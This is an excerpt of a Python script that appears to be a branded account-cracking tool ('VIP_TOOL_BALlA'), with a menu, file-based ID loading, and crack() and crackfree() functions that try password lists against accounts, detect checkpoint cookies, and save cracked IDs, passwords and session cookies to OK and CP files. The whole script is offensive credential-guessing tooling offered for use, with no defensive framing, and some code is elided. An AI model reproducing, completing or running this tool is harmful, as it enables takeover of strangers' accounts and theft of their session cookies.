...
os.system('espeak -a 300 " WELCOME TO Balla"')
...
-------------------------------------------------
\033[1;96m𝐕𝐈𝐏 𝐓𝐎𝐎𝐋 :   balla
\x1b[92;1m𝐓𝐄𝐋𝐄𝐆𝐑𝐀𝐌 :  balla_baretane
\33[1;33m𝐁𝐘 𝐓𝐎𝐎𝐋 : 2.9
\33[1;34m𝐍𝐀𝐄𝐌 𝐓𝐎𝐎𝐋 : -            VIP_TOOL_BALlA
------------------------------------------------"""
os.system('clear')
print(logo)
uname = input(" [\u001b[36m•\033[1;37m] nawt chya kona 7is😂 ?: " )
print('\033[1;37m----------------------------------------------')
...
def menu():
    ...
    linex()
    print(f""" [\u001b[34m1\033[1;94m]  File Cloning        """)
    print(""" [\u001b[36m0\033[1;37m] Exit""")
    linex()
    _____cowok__pink_____ = input(' CHOOSE : ')
    if _____cowok__pink_____ in ['88']:
        login()
        dump_massal()
    elif _____cowok__pink_____ in ['1']:
        crack_file()
    elif _____cowok__pink_____ in ['9','09']:
        contact()
    elif _____cowok__pink_____ in ['89','098']:
        result()
...
def crack_file():
    linex()
    o = input(' [\u001b[36m•\033[1;37m] NAWE FILE💾  : ')
...
def setting():
    linex()
    print(" [\u001b[36m1\033[1;37m]  All Checking")
    linex()
...
def crack(idf,pwv):
    ...
    sys.stdout.write(f"\r {P}[balla🖤]{P} {P}{loop}{P}/{P}{len(id)}{P} OK{P}[{H}{ok}{P}] [{P}{'{:.0%}'.format(loop/float(len(id)))}{P}]  "),
    sys.stdout.flush()
    ...
    for pw in pwv:
        try:
            ...
            if "checkpoint" in po.cookies.get_dict().keys():
                print(f'\033[1;35m[balla cp💔]   \033[1;35m {idf} |  \033[1;35m{pw}  | \033[1;35m{ua}')
                ...
                print(f'\r\x1b[32[balla_ok  ]\033[1;32m   {idf} | \033[1;32m{pw} | \033[1;32m{kuki} | \033[1;32m{ua}')
                os.system('espeak -a 1000 " hasa qwn dar  "')
...
def crackfree(idf,pwv):
    global loop,ok,cp
    sys.stdout.write(f"\r {P}[R4 Balla🔥☝TEST]{P} {P}{loop}{P}/{P}{len(id)}{P} OK{P}[{H}{ok}{P}] [{P}{'{:.0%}'.format(loop/float(len(id)))}{P}]  "),
    sys.stdout.flush()
    ua = random.choice(ugen)
    ua2 = random.choice(ugen2)
    ses = requests.Session()
    ...
    'viewport-width': '980',}
            ...
            if "checkpoint" in po.cookies.get_dict().keys():
                print ('\x1b[36m||')
                print(f'\r\033[0;93m[\33[1;96mSUUU👐-CP\33[1;93m]  {idf}  {pw} ')
                print ('\x1b[36m||')
                open('CP/'+cpc,'a').write(idf+' • '+pw+'\n')
                akun.append(idf+' • '+pw)
                cp+=1
                ...
                kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
                print ('\x1b[32m||')
                print(f'\r\33[1;93m[\33[1;92mJIOO-OK\33[1;93m] \33[1;92m{idf} {pw} ')
                os.system('espeak -a 300 " Balla OK HAW 7ISOKA  CRACKED OK ID"')
                print ('\x1b[32m||')
                open('OK/'+okc,'a').write(idf+' • '+pw+'\n')
                cek_DYNO(kuki)
                break
